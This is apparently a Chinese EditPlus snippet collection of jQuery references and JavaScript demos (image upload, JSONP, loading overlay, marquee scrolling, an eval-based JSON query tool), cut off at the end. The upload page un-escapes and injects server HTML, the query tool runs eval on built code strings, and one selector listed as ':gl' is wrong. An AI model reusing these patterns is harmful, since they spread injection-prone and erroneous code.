$("tr:odd") 匹配集合中奇数位置的所有元素(从0开始) 
$("td:eq(2)") 匹配集合中指定位置的元素(从0开始) 
$("td:gt(4)") 匹配集合中指定位置之后的所有元素(从0开始) 
$("td:gl(4)") 匹配集合中指定位置之前的所有元素(从0开始) 
$(":header") 匹配所有标题 
$("div:animated") 匹配所有正在运行动画的所有元素 
内容过滤选择器 
$("div:contains('John')") 匹配含有指定文本的所有元素 
$("td:empty") 匹配所有空元素(只含有文本的元素不算空元素) 
$("div:has(p)") 从原元素集合中再次匹配所有至少含有一个selector的所有元素 
$("td:parent") 匹配所有不为空的元素(含有文本的元素也算) 
$("div:hidden") 匹配所有隐藏的元素，也包括表单的隐藏域 
$("div:visible") 匹配所有可见的元素 
属性过滤选择器 
$("div[id]") 匹配所有具有指定属性的元素 
$("input[name='newsletter']") 匹配所有具有指定属性值的元素 
$("input[name!='newsletter']") 匹配所有不具有指定属性值的元素 
$("input[name^='news']") 匹配所有指定属性值以value开头的元素 
$("input[name$='letter']") 匹配所有指定属性值以value结尾的元素 
$("input[name*='man']") 匹配所有指定属性值含有value字符的元素 
$("input[id][name$='man']") 匹配同时符合多个选择器的所有元素 
子元素过滤选择器 
$("ul li:nth-child(2)"), 
$("ul li:nth-child(odd)"), 匹配父元素的第n个子元素 
$("ul li:nth-child(3n + 1)") 

$("div span:first-child") 匹配父元素的第1个子元素 
$("div span:last-child") 匹配父元素的最后1个子元素 
$("div button:only-child") 匹配父元素的唯一1个子元素 
表单元素选择器 
$(":input") 匹配所有的表单输入元素，包括所有类型的input, textarea, select 和 button 
$(":text") 匹配所有类型为text的input元素 
$(":password") 匹配所有类型为password的input元素 
$(":radio") 匹配所有类型为radio的input元素 
$(":checkbox") 匹配所有类型为checkbox的input元素 
$(":submit") 匹配所有类型为submit的input元素 
$(":image") 匹配所有类型为image的input元素 
$(":reset") 匹配所有类型为reset的input元素 
$(":button") 匹配所有类型为button的input元素 
$(":file") 匹配所有类型为file的input元素 
$(":hidden") 匹配所有类型为hidden的input元素或表单的隐藏域 
表单元素过滤选择器 
$(":enabled") 匹配所有可操作的表单元素 
$(":disabled") 匹配所有不可操作的表单元素 
$(":checked") 匹配所有已点选的元素 
$("select option:selected") 匹配所有已选择的元素 


JQuery CSS 方法说明 

css( name ) 访问第一个匹配元素的样式属性。 
css( properties ) 把一个"名/值对"对象设置为所有匹配元素的样式属性。 
	$("p").hover(function () { 
	$(this).css({ backgroundColor:"yellow", fontWeight:"bolder" }); 
	}, function () { 
	var cssObj = { 
	backgroundColor: "#ddd", 
	fontWeight: "", 
	color: "#0028f4" 
	} 
	$(this).css(cssObj); 
	}); 
css( name, value ) 在所有匹配的元素中，设置一个样式属性的值。 
offset( ) 取得匹配的第一个元素相对于当前可视窗口的位置。返回的对象有2个属性，top和left，属性值为整数。这个函数只能用于可见元素。 
	var p = $("p:last"); 
	var offset = p.offset(); 
	p.html( "left: " + offset.left + ", top: " + offset.top ); 
width( ) 取得当前第一匹配的元素的宽度值， 
width( val ) 为每个匹配的元素设置指定的宽度值。 
height( ) 取得当前第一匹配的元素的高度值， 
height( val ) 为每个匹配的元素设置指定的高度值。 

JQuery Utilities 方法说明 
jQuery.browser 
.msie 表示ie 
jQuery.browser.version 读取用户浏览器的版本信息 
jQuery.boxModel 检测用户浏览器针对当前页的显示是否基于W3C CSS的盒模型 
jQuery.isFunction( obj ) 检测传递的参数是否为function 
	function stub() { } 
	var objs = [ 
	function () {}, 
	{ x:15, y:20 }, 
	null, 
	stub, 
	"function" 
	]; 
	jQuery.each(objs, function (i) { 
	var isFunc = jQuery.isFunction(objs[i]); 
	$("span:eq( " + i + ")").text(isFunc); 
	}); 
jQuery.trim( str ) 清除字符串两端的空格，使用正则表达式来清除给定字符两端的空格 
jQuery.each( object, callback ) 一个通用的迭代器，可以用来无缝迭代对象和数组 
jQuery.extend( target, object1, [objectN] ) 扩展一个对象，修改原来的对象并返回，这是一个强大的实现继承的工具，这种继承是采用传值的方法来实现的，而不是JavaScript中的原型链方式。 
	合并settings和options对象，返回修改后的settings对象 
	var settings = { validate: false, limit: 5, name: "foo" }; 
	var options = { validate: true, name: "bar" }; 
	jQuery.extend(settings, options); 

	合并defaults和options对象，defaults对象并没有被修改。options对象中的值代替了defaults对象的值传递给了empty。 
	var empty = {} 
	var defaults = { validate: false, limit: 5, name: "foo" }; 
	var options = { validate: true, name: "bar" }; 
	var settings = $.extend(empty, defaults, options); 
	
jQuery.grep( array, callback, [invert] ) 通过一个筛选函数来去除数组中的项 
	$.grep( [0,1,2], function(n,i){ 
	return n > 0; 
	}); 
jQuery.makeArray( obj ) 将一个类似数组的对象转化为一个真正的数组 
	将选取的div元素集合转化为一个数组 
	var arr = jQuery.makeArray(document.getElementsByTagName("div")); 
	arr.reverse(); // use an Array method on list of dom elements 
	$(arr).appendTo(document.body); 
jQuery.map( array, callback ) 使用某个方法修改一个数组中的项，然后返回一个新的数组 
jQuery.inArray( value, array ) 返回value在数组中的位置，如果没有找到，则返回-1 
jQuery.unique( array ) 删除数组中的所有重复元素，返回整理后的数组 
#T=jQuery图片即时上传
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<title>jQuery Upload Image</title>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8"
		/>
		<meta http-equiv="Content-Language" content="zh-CN" />
		<!--<script type="text/javascript" src="jquery-1.6.2.min.js"></script>-->
		<!-- 本地jquery库-->
		<script type="text/javascript" src="http://files.cnblogs.com/Zjmainstay/jquery-1.6.2.min.js"></script>
	</head>
	<body>
		<style>
			#exec_target {
				display:none;
				width:0;
				height:0;
			}
			#feedback {
				width:1200px;
				margin:0 auto;
			}
			#feedback img {
				float:left;
				width:300px;
				height:300px;
			}
			
		</style>
		<script type="text/javascript">
$(document).ready(function ()
{
	//选择文件成功则提交表单
	$("#upload_file").change(function ()
	{
		if ($("#upload_file").val() != '') $("#submit_form").submit();
	});
	//iframe加载响应，初始页面时也有一次，此时data为null。
	$("#exec_target").load(function ()
	{
		var data = $(window.frames['exec_target'].document.body).find("textarea").html();
		//若iframe携带返回数据，则显示在feedback中
		if (data != null)
		{
			$("#feedback").append(data.replace(/&lt;/g, '<').replace(/&gt;/g, '>'));
			$("#upload_file").val('');
		}
	});
});
		</script>
		<form id="submit_form" method="post" action="submit_form_process.php"
		target="exec_target" enctype="multipart/form-data">
			<input type="file" name="upload_file" id="upload_file">
			<!-- 添加上传文件 -->
		</form>
		<iframe id="exec_target" name="exec_target"></iframe>
		<!-- 提交表单处理iframe框架 -->
		<div id="feedback"></div>
		<!-- 响应返回数据容器 -->
	</body>

</html>
#T=jsonp
<!doctype html>
<html>
  <head>
    <title>jsonp跨域请求 by 司徒正美</title>
    <meta charset="utf-8"/>
    <meta content="IE=8" http-equiv="X-UA-Compatible"/>
    <meta name="keywords" content="jsonp跨域请求 by 司徒正美" />
    <meta name="description" content="jsonp跨域请求 by 司徒正美" />
    <script type="text/javascript" charset="utf-8">

      //暴露类库唯一一个全局变量作为命名空间

      var dom = {
        is:function (obj,type) {
          return (type === "Null" && obj === null) ||
            (type === "Undefined" && obj === void 0 ) ||
            Object.prototype.toString.call(obj).slice(8,-1) === type;
        },
        noop:function(){},
        deepcopy:function(result, source){
          for(var key in source) {
            var copy = source[key];
            if(result === copy) continue;//如window.window === window，会陷入死循环，需要处理一下
            if(dom.is(copy,"Object")){
              result[key] = arguments.callee(result[key] || {}, copy);
            }else if(dom.is(copy,"Array")){
              result[key] = arguments.callee(result[key] || [], copy);
            }else{
              result[key] = copy;
            }
          }
          return result;
        },
        each : function(obj,fn,bind){
          for(var i in obj){
            if(obj.hasOwnProperty(i)){
              if(fn.call(bind || obj[i],obj[i],i,obj)===false){
                break
              }
            }
          }
        },
        toQueryString : function (obj) {//将对象转换为查询字符串
          var enc = encodeURIComponent,
          pairs = [],
          regexp = /%20/g,
          backstop = {};
          dom.each(obj,function(value,name){
            if(value != backstop[name]){
              var assign = enc(name).replace(regexp,'+') + "=";
              if(dom.is(value,"Array")){
                dom.each(value,function(el){
                  pairs.push(assign + enc(el).replace(regexp,'+'));
                });
              }else{
                pairs.push(assign + enc(value).replace(regexp,'+'));
              }
            }
          });
          return pairs.join("&"); // String
        },
        head:document.getElementsByTagName("head")[0],
        //obj的成员有url,callbackName,callback,data,cache
        jsonp : function(obj){
          var self = arguments.callee;
          //=============列队处理======================
          if (self.callbacks.length) {
            setTimeout(function() {self(obj)}, 0);
            return;
          }
          //=============配置对象处理===================
          obj = dom.deepcopy(dom.deepcopy({}, dom.jsonp.settings), obj);
          
          var query = dom.toQueryString(obj.data),
          url = obj.url+"?"+ query+"&"+obj.callbackName+"=dom.jsonp.callback",
          script = document.createElement("script"),
          timed_out = false, timeoutID = null,
          destroyScript = function(){
            script.parentNode && script.parentNode.removeChild( script );
          }, old = obj.onComplete;
          obj.startTime = new Date-0;

          obj.onComplete = function(){//修正onComplete回调%>
            if(!arguments.callee.done){
              old.call(this,[].slice.call(arguments))
              arguments.callee.done = true;
            }
          }
          //========构建新JS文件上的回调函数==================
          dom.jsonp.addCallback((function(obj){
            return function(){//参数未定，第一个参数肯定为JSON

              var args = [].slice.call(arguments)
              try{
                if (!timed_out){//清除timeout引用
                  clearTimeout(timeoutID);
                }else{
                  throw new Error(504,"Gateway Timeout")
                }
                obj.onSuccess.apply(obj,args);
              }catch(e){
                obj.onError.call(null,e);
              }finally{
                obj.onComplete.apply(obj,args);
                destroyScript();
              }
            }
          })(obj));
          //================设置script标签=============
         // if(!obj.cache)
          //  url+= '×tamp='+(new Date-0)
           script.charset ="UTF-8"
          script.src = url;

          dom.head.appendChild(script);

          obj.onStart.call(obj,null);
          
          //===========设置请求超时的相关回调============
          if (obj.timeout){
            timeoutID = setTimeout(function(){
              //如果超时则执行如下回调函数
              timed_out = true;
              var time = new Date  - obj.startTime;
              obj.onTimeout.call(obj,time);
              obj.onComplete.call(obj,null);
              destroyScript();
            },obj.timeout)
          }


        }
      };
      dom.deepcopy(dom.jsonp, {
        settings : {
          url:location.href,
          callbackName: 'callback',
          cache:false,
          onStart:dom.noop,
          onSuccess:dom.noop,
          onComplete:dom.noop,
          onTimeout:dom.noop,
          onError:dom.noop
        },
        callbacks : [],
        callback :function(){//统一处理回调函数
          var objs = this.callbacks,
          args = [].slice.call(arguments)
          for (var i=0,el;el=objs[i++];) {
            el.apply(null,args)
          }
          this.callbacks = [];
        },
        addCallback : function(obj){
          this.callbacks.push(obj)
        }
      });
      window.onload = function(){
        dom.jsonp({
          url:"http://api.flickr.com/services/feeds/photos_public.gne",
          onSuccess:function(json){//现在是测试，理应赋一个空函数
            throw "强制发生错误"
          },
          onStart:function(){
            alert("第一个请求开始了")
          },
          onComplete:function(){
            alert("第一个请求完成了")
          },
          onError:function(e){
            alert("发生[ "+e+" ]错误")
          },

          data:{
            tags: 'cat',
            tagmode: 'any',
            format: 'json' },
          callbackName:"jsoncallback"});

        dom.jsonp({
          url:"http://api.cnet.com/restApi/v1.0/techProductSearch",
          onSuccess:function(json){
            if(window.JSON){
              alert(window.JSON.stringify(json))
            }
          },
          onStart:function(){
            alert("第二个请求开始了")
          },
          onComplete:function(){
            alert("第二个请求完成了")
          },
          data:{
            partTag: 'mtvo',
            iod: 'hlPrice',
            viewType: 'json',
            results: '100',
            query: 'ipod'},
          callbackName:"callback"});

        dom.jsonp({
          onStart:function(){
            alert("第三个请求开始了")
          },
          onSuccess:function(json){
            if(window.JSON){
              alert(window.JSON.stringify(json))
            }
          },
          onComplete:function(){
            alert("第三个请求完成了")
          },
          timeout:400,
          onTimeout:function(t){
            alert("一共耗时"+t+"毫秒")
          },
          onError:function(e){
            alert("发生[ "+e+" ]错误")
          },
          url:"http://del.icio.us/feeds/json/fans/stomita",
          callbackName:"callback"});
        dom.jsonp({
          onStart:function(){
            alert("第四个请求开始了")
          },
          onSuccess:function(json){
            if(window.JSON){
              alert(window.JSON.stringify(json))
            }
          },
          onComplete:function(){
            alert("第四个请求完成了")
          },
          url:"http://api.search.yahoo.com/WebSearchService/V1/webSearch",
          data:{
            appid:"YANCPYV74SDXOZ61",
            output:"json",
            query:"yahoo"
          }
        });

      }


    </script>

  </head>
  <body>
    <h1>JSONP跨域请求by 司徒正美</h1>

  </body>
</html>

#T=JS判断页面加载状态以及添加遮罩和缓冲动画
function initialize() {
    addcloud(); //为页面添加遮罩
    document.onreadystatechange = subSomething; //监听加载状态改变
}
 
function addcloud() {
    var bodyWidth = document.documentElement.clientWidth;
    var bodyHeight = Math.max(document.documentElement.clientHeight, document.body.scrollHeight);
    var bgObj = document.createElement("div" );
    bgObj.setAttribute( 'id', 'bgDiv' );
    bgObj.style.position = "absolute";
    bgObj.style.top = "0";
    bgObj.style.background = "#000000";
    bgObj.style.filter = "progid:DXImageTransform.Microsoft.Alpha(style=3,opacity=25,finishOpacity=75" ;
    bgObj.style.opacity = "0.5";
    bgObj.style.left = "0";
    bgObj.style.width = bodyWidth + "px";
    bgObj.style.height = bodyHeight + "px";
    bgObj.style.zIndex = "10000"; //设置它的zindex属性，让这个div在z轴最大，用户点击页面任何东西都不会有反应|
    document.body.appendChild(bgObj); //添加遮罩
    var loadingObj = document.createElement("div");
    loadingObj.setAttribute( 'id', 'loadingDiv' );
    loadingObj.style.position = "absolute";
    loadingObj.style.top = bodyHeight / 2 - 32 + "px";
    loadingObj.style.left = bodyWidth / 2 + "px";
    loadingObj.style.background = "url(../img/loading.gif)" ;
    loadingObj.style.width = "32px";
    loadingObj.style.height = "32px";
    loadingObj.style.zIndex = "10000"; 
    document.body.appendChild(loadingObj); //添加loading动画-
}
 
function removecloud() {
    $( "#loadingDiv").remove();
    $( "#bgDiv").remove();
}
 
function subSomething() {
    if (document.readyState == "complete" ) //当页面加载完毕移除页面遮罩，移除loading动画-
    {
        removecloud();
    }
}
#T=Knockout.js simple
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<title>hello! Knockout.js</title>
	<!-- <base href="http://api.asp.net.local" /> -->
	<!-- <script src="http://api.asp.net.local/Scripts/jquery.mobile-1.3.1.js" type="text/javascript"></script> -->
	<script src="http://api.asp.net.local/Scripts/jquery-1.8.2.js" type="text/javascript"></script>
	<script src="http://api.asp.net.local/Scripts/knockout-2.3.0.js" type="text/javascript"></script>
	<!-- <script src="http://api.asp.net.local/Scripts/knockout.simpleGrid.1.3.js" type="text/javascript"></script> -->
</head>
<body>
	<p>姓: <input data-bind="value: lastName" /></p>
	<p>名: <input data-bind="value: firstName" /></p>
	<h2>你好, <span data-bind="text: fullName"> </span>!</h2>
	<script type="text/javascript">
		var ViewModel = function(last, first) {
				this.firstName = ko.observable(first);
				this.lastName = ko.observable(last);
				this.fullName = ko.computed(function() {
						return this.firstName() + " " + this.lastName();
					}, this);
			};
		ko.applyBindings(new ViewModel("星","火")); // This makes Knockout get to work
	</script>
</body>
</html>
#T=lambda
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
</head>
<body>
<script type="text/javascript">
<!--
	var c = "a";
	var a = 
			{
				"a" :
					//"abc"
					(
						function()
						{
							alert("A");
						}
					)
				, b :
					(
						function(x)
						{
							alert(x);
						}
					)
			};
	a[c]();
	a["b"]("B");
	//a[0]();
//-->
</script>
</body>
</html>

#T=Linq (NOT) Json Query
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<title>new document</title>
		<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
		<META NAME="Author" CONTENT="EditPlus,Microshaoft">
		<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
		<META NAME="Description" CONTENT="EditPlus,Microshaoft">
		<script type="text/javascript">
		/*
		 * 定义模板函数
		 */
			var template = function (queryArr)
				{
					var count = 0;
					for (var i = 0; i < queryArr.length; i++)
					{
						var e = queryArr[i];
						if ($express)
						{
							count++;
						}
					}
					return count;
				}
				/*
					 * 模板创建函数
					*/
			var createIntance = function (exp)
				{
					var fun = template.toString().replace("$express", exp).toString();
					return eval("0," + fun);
				}
			var testTodo = function ()
				{
					var testArr = [
					{
						name: "张三",
						age: 20},
					{
						name: "李四",
						age: 25},
					{
						name: "王二麻子",
						age: 28},
					{
						name: "小张",
						age: 30}
					];
					var func = createIntance("e.age>=25");
					alert(func(testArr));
				}
				/****************** JS 实现 JSON查询 **********************/

				// 定义常用的函数
			var len = function (s)
				{
					return s.length;
				}
			var left = function (s, n)
				{
					return s.substr(0, n);
				}
			var right = function (s, n)
				{
					return s.substr(-n);
				}
			var index = function (s, find)
				{
					return s.indexOf(find) + 1;
				}
				// 扩展原型方法
			var _proto = Object.prototype;
			// 缓存,解决快速查找
			var _cache = {};
			// 扩展运算符
			var _alias = [
				/@/g, "_e.",
				/AND/gi, "&&",
				/OR/gi, "||",
				/<>/g, "!=",
				/NOT/gi, "!",
				/([^=<>])=([^=]|$)/g, '$1==$2'
				];
			var _rQuote = /""/g;
			var _rQuoteTemp = /!~/g;
			// 编译
			var _complite = function (code)
				{
					return eval("0," + code);
				}
				// 将扩展符号转换成标准的JS符号
			var _interpret = function (exp)
				{
					exp = exp.replace(_rQuote, "!~");
					var arr = exp.split('"');
					var i, n = arr.length;
					var k = _alias.length;
					for (var i = 0; i < n; i += 2)
					{
						var s = arr[i];
						for (var j = 0; j < k; j += 2)
						{
							if (index(s, _alias[j]) > -1)
							{
								s = s.replace(_alias[j], _alias[j + 1]);
							}
						}
						arr[i] = s;
					}
					for (var i = 1; i < n; i += 2)
					{
						arr[i] = arr[i].replace(_rQuoteTemp, '\\"');
					}
					return arr.join('"');
				}
				// 定义模函数
			var _templ = function (_list)
				{
					var _ret = [];
					var _i = -1;
					for (var _k in _list)
					{
						var _e = _list[_k];
						if (_e != _proto[_k])
						{
							if ($C)
							{
								_ret[++_i] = _e;
							}
						}
					}
					return _ret;
				}.toString();
			// 扩展查询的方法
			_proto.Query = function (exp)
			{
				if (!exp)
				{
					return [];
				}
				var fn = _cache[exp];
				try
				{
					if (!fn)
					{
						var code = _interpret(exp);
						code = _templ.replace("$C", code);
						fn = _cache[exp] = _complite(code);
					}
					return fn(this);
				}
				catch (e)
				{
					return [];
				}
			}
			var doTest = function (x)
				{
					alert(x);
					var heros = [
						// 名============攻=====防=======力量====敏捷=====智力====
					{
						name: '冰室女巫',
						DP: 38,
						AP: 1.3,
						Str: 16,
						Dex: 16,
						Int: 21},
					{
						name: '沉默术士',
						DP: 39,
						AP: 1.1,
						Str: 17,
						Dex: 16,
						Int: 21},
					{
						name: '娜迦海妖',
						DP: 51,
						AP: 6.0,
						Str: 21,
						Dex: 21,
						Int: 18},
					{
						name: '赏金猎人',
						DP: 39,
						AP: 4.0,
						Str: 17,
						Dex: 21,
						Int: 16},
					{
						name: '剧毒术士',
						DP: 45,
						AP: 3.1,
						Str: 18,
						Dex: 22,
						Int: 15},
					{
						name: '光之守卫',
						DP: 38,
						AP: 1.1,
						Str: 16,
						Dex: 15,
						Int: 22},
					{
						name: '炼金术士',
						DP: 49,
						AP: 0.6,
						Str: 25,
						Dex: 11,
						Int: 25}
						//...
						];
					var match = heros.Query('@Str>20 AND @Dex>20');
					ShowResult(match[0]);
					// 查询：“士”结尾的
					// 结果：沉默术士,剧毒术士,炼金术士
					var match = heros.Query('right(@name,1)="士"');
					ShowResult(match[0]);
				}
			function ShowResult(result)
			{
				alert(result.name + " " + result.DP + " " + result.AP + " " + result.Str + " " + result.Dex + " " + result.Int);
			}
		</script>
	</head>
	<body>
		<input type="button" value="Click Me" onclick="doTest('test')" />
	</body>

</html>
#T=Marquee
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
  <title> new document </title>
  <meta name="generator" content="editplus" />
  <meta name="author" content="" />
  <meta name="keywords" content="" />
  <meta name="description" content="" />

<script language="javascript">
	window.onload = function()
	{
		MarqueeStart("marqueeImage",1,878,130,20,0,"table");
		MarqueeStart("guester",2,250,310,20,0,"dl");
		}

function Marquee(MarName)
{
	this.ID = document.getElementById(MarName);
	this.Speed = 30; //数字越大速度越慢
	this.Direction = 0;//滚动方向：0代表左;1代表右;2代表上;3代表下 
	this.Width = 0;//高度
	this.Height = 0;//宽度
	this.Space = 0;//是否有间隙：0代表否;1代表是
	this.Tag = "p";//滚动内容的标签,默认是<p>，也可以是<ul>，实践证明：<p>与<ul>不能嵌套使用。其他标签暂时不推荐。
	//开始滚动
	this.Start = function()
	{
		MarqueeStart(this,this.Direction,this.Width,this.Height,this.Speed,this.Space,this.Tag);
	}
	//停止滚动并释放对象
	this.End = function()
	{
		MarqueeEnd(this);
	}
}

function MarqueeStart(Mar,Direction,Width,Height,Speed,Space,Tag)
{
	var msobj;
	if(typeof(Mar) == "string"){
		msobj = new Marquee(Mar);
	}
	if(typeof(Mar) == "object"){
		msobj = Mar;
	}
	if(!msobj.ID) return;
	msobj.ID.style.width = Width + "px";
	msobj.ID.style.height = Height + "px";
	msobj.ID.style.overflow = msobj.ID.style.overflowX = msobj.ID.style.overflowY = "hidden";
	msobj.Direction = Direction;
	msobj.Width = Width;
	msobj.Height = Height;
	msobj.Speed = Speed;
	msobj.Space = Space;
	msobj.Tag = Tag;
	msobj.InnerDiv = msobj.ID.getElementsByTagName("div")[0];
	if(!msobj.InnerDiv) return;
	msobj.InnerDiv.innerHTML += msobj.InnerDiv.innerHTML;
	msobj.Inner = msobj.ID.getElementsByTagName(Tag); 
	if(!msobj.Inner) return;
	switch(Direction)
	{	
		case 2:
			msobj.InnerDiv.style.width = Width + "px";
			msobj.Inner[0].style.width =Width + "px";
			msobj.Inner[1].style.width =Width + "px";
			if (Height>=msobj.Inner[1].offsetHeight || msobj.Space ==1)
			{
				msobj.Inner[0].style.paddingTop = Height + "px";
				msobj.Inner[1].style.paddingTop = Height + "px";;
			}	
			break;
		case 3:
			msobj.InnerDiv.style.width = Width + "px";
			msobj.Inner[0].style.width =Width + "px";
			msobj.Inner[1].style.width =Width + "px";			
			if(Height>=msobj.Inner[1].offsetHeight || msobj.Space ==1)
			{
				msobj.Inner[0].style.paddingBottom = Height + "px";
				msobj.Inner[1].style.paddingBottom = Height + "px";
			}
			break;
		default :
			msobj.InnerDiv.noWrap = true;
			if(Width >= msobj.Inner[1].offsetWidth || msobj.Space ==1)
			{
				msobj.Inner[0].style.paddingLeft = Width + "px";
				msobj.Inner[1].style.paddingLeft = Width + "px";
			}
			break;
	}
	
	msobj.ID.onmouseover = function()
	{
		clearInterval(msobj.TimerID);
	}
	
	msobj.ID.onmouseout = function()
	{
		clearInterval(msobj.TimerID);
		msobj.TimerID = funcInterval(MarqueeScroll,msobj.Speed,msobj);
	}
	msobj.TimerID = funcInterval(MarqueeScroll,msobj.Speed,msobj);
}

function MarqueeScroll(Mar)
{
	switch(Mar.Direction)
	{
		case 0 :
			if (Mar.Inner[1].offsetWidth-Mar.ID.scrollLeft<=0)
			{
				Mar.ID.scrollLeft-=Mar.Inner[0].offsetWidth;
			}
			else
			{
				Mar.ID.scrollLeft++;
			}
			break;
		case 1 :
			if(Mar.ID.scrollLeft==0)
				Mar.ID.scrollLeft=Mar.Inner[1].offsetWidth;
			else{
				Mar.ID.scrollLeft--;
			}
		break;
		case 2 :
			if(Mar.Inner[1].offsetHeight-Mar.ID.scrollTop<=0)
				Mar.ID.scrollTop-=Mar.Inner[0].offsetHeight;
			else{
				Mar.ID.scrollTop++;
			}
			break;
		case 3 :
			if (Mar.ID.scrollTop<=0)
			{
				Mar.ID.scrollTop = Mar.Inner[1].offsetHeight;
			}
			else
			{
				Mar.ID.scrollTop--;
			}
		break;
	}
}

function MarqueeEnd(Mar)
{
	if (!Mar) 
	{
		return;
	}
	if (typeof(Mar.TimerID) == "number")
	{
		clearInterval(Mar.TimerID);
		Mar = null;
	}
}

function funcInterval(funcName,time)
{
	var args=[];
	for (var i = 2; i < arguments.length; i++)
	{
		args.push(arguments[i]);
	}
	return window.setInterval(function(){
			funcName.apply(this,args);
		},time);
}
</script>
</head>
<body>


						<div id="marqueeImage" >
						 	<div style="width:870px;">
									<!--产品开始-->
										<table cellspacing="0" cellpadding="3" align="center" border="0" >
											<tr>
																								<td width="157" height="116">
													<a href="" rel="lightbox" title="">
														<img src="http://images.csdn.net/20080312/孙伟s.JPG" border="0" class="img_border1" /></a></td>
																								<td width="157" height="116">
													<a href="" rel="lightbox" title="">
														<img src="http://images.csdn.net/20080312/于晶纯s.JPG" border="0" class="img_border1" /></a></td>
																								<td width="157" height="116">
													<a href="" rel="lightbox" title="">
														<img src="http://images.csdn.net/20080312/宋兴烈s.JPG" border="0" class="img_border1" /></a></td>
																								<td width="157" height="116">
													<a href="" rel="lightbox" title="">
														<img src="http://images.csdn.net/20080312/梁公军s.JPG" border="0" class="img_border1" /></a></td>
																								<td width="157" height="116">
													<a href="" rel="lightbox" title="">
														<img src="http://images.csdn.net/20080312/张跃s.jpg" border="0" class="img_border1" /></a></td>
																								<td width="157" height="116">
													<a href="" rel="lightbox" title="">
														<img src="http://images.csdn.net/20080312/IMG_8209.jpg" border="0" class="img_border1" /></a></td>
																								<td width="157" height="116">
													<a href="" rel="lightbox" title="CSDN CEO 蒋涛">
														<img src="http://images.csdn.net/20080229/g_img_4.gif" border="0" class="img_border1" /></a></td>
																								<td width="157" height="116">
													<a href="" rel="lightbox" title="">
														<img src="http://images.csdn.net/20080312/IMG_5121.jpg" border="0" class="img_border1" /></a></td>
																								<td width="157" height="116">
													<a href="" rel="lightbox" title="">
														<img src="http://images.csdn.net/20080312/IMG_5123.jpg" border="0" class="img_border1" /></a></td>
																								<td width="157" height="116">
													<a href="" rel="lightbox" title="">
														<img src="http://images.csdn.net/20080312/IMG_7957.jpg" border="0" class="img_border1" /></a></td>
																							</tr>
										</table>
										<!--产品结束-->
							 </div>
						</div>

				<div class="video_2">
					<dl>
						<dt>大会嘉宾</dt>
						<dd>
						 <div id="guester" > <a name="moreUser" id="moreUser"> </a>
								<div > <dl>
														<p style="height: 30px;">
							   刘忠 FreeWheel 开发部经理</p>
														<p style="height: 30px;">
							   刘开阳 汉星天(中国）公司CTO</p>
														<p style="height: 30px;">
							   王小川 搜狐公司高级副总裁</p>
														<p style="height: 30px;">
							   吴锡桑 火石软件CEO</p>
														<p style="height: 30px;">
							   钱宏武 资深互联网社区架构师</p>
														<p style="height: 30px;">
							   姚键 优酷网CTO</p>
														<p style="height: 30px;">
							   郑昀 玩聚网创始人</p>
														<p style="height: 30px;">
							   潘海东 互动在线首席执行官</p>
														<p style="height: 30px;">
							   张侠 SAP大中华区首席技术官</p>
														<p style="height: 30px;">
							   胡长城 普元产品经理</p>
														<p style="height: 30px;">
							   吴莹莹topcoder亚太运营副总裁</p>
														<p style="height: 30px;">
							   吴嘉之topcoder中国技术副总裁</p>
														<p style="height: 30px;">
							   王浩然  uuSee 技术总监</p>
														<p style="height: 30px;">
							   吕欣欣 FeedSky总裁</p>
														<p style="height: 30px;">
							   郝培强 银杏咨询创始人</p>
														<p style="height: 30px;">
							   毛新生 IBM大中华区主管架构师</p>
														<p style="height: 30px;">
							   Jeff  Maxthon浏览器创始人</p>
														<p style="height: 30px;">
							   熊节 ThoughtWorks咨询师</p>
														<p style="height: 30px;">
							   刘松 毕意辉中国系统公司经理</p>
														<p style="height: 30px;">
							   杨凯程 酷溜网CTO</p>
														<p style="height: 30px;">
							   谌振宇 抓虾网创始人</p>
														<p style="height: 30px;">
							   高焕堂 MISOO公司CSA</p>
														<p style="height: 30px;">
							   潘加宇 UML China首席专家</p>
														<p style="height: 30px;">
							   孙伟 北航软件学院院长</p>
														<p style="height: 30px;">
							   黄方荣 web开发工程师</p>
														<p style="height: 30px;">
							   梁公军 鲜果网创始人</p>
														<p style="height: 30px;">
							   张跃 北京词酷CEO </p>
														<p style="height: 30px;">
							   许式伟 技术总监</p>
														<p style="height: 30px;">
							   Diane Yu  FreeWheel CTO</p>
														<p style="height: 30px;">
							   宋兴烈 起步总工程师</p>
														<p style="height: 30px;">
							   刘韧 DoNews制作人</p>
														<p style="height: 30px;">
							   周立功 江西理工大学教授</p>
														<p style="height: 30px;">
							   饶宏 播思公司首席技术官</p>
																</dl>
								</div>
							</div>
						</dd>
					</dl>
				</div>
 </body>
</html>

#T=Marquee Scroll Text
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
  <html xmlns="http://www.w3.org/1999/xhtml" >
  <head>
      <title>K2046.ScrollText</title>
<script type="text/javascript">
	<!--
	function ScrollText(content,btnPrevious,btnNext,autoStart)
	{
		this.Delay = 10;
		this.LineHeight = 20;
		this.Amount = 1;//注意:LineHeight一定要能整除Amount.
		this.Direction = "up";
		this.Timeout = 1500;
		this.ScrollContent = this.$(content);
		this.ScrollContent.innerHTML += this.ScrollContent.innerHTML;
		//this.ScrollContent.scrollTop = 0;
		if(btnNext)
		{
